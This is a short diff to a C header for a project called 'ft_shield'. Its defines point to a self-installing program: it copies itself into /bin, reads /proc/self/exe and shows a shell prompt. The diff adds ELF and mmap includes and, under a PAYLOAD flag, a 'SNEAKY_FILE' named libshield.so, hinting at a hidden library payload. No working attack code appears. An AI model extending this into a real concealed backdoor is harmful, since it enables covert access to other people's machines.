@@ -1,8 +1,11 @@
 #ifndef FT_SHIELD_H
 # define FT_SHIELD_H
 
+# define _GNU_SOURCE
+# include <elf.h>
 # include <fcntl.h>
 # include <libgen.h>
+# include <sys/mman.h>
 # include <netinet/in.h>
 # include <signal.h>
 # include <stdbool.h>
@@ -19,6 +22,10 @@
 # define PRG_NAME "ft_shield"
 # define TARGET_LOCATION "/bin"
 # define PROC_SELF_EXE "/proc/self/exe"
+
+# ifdef PAYLOAD
+#  define SNEAKY_FILE "libshield.so"
+# endif
 
 # define PROMPT "$> "
 
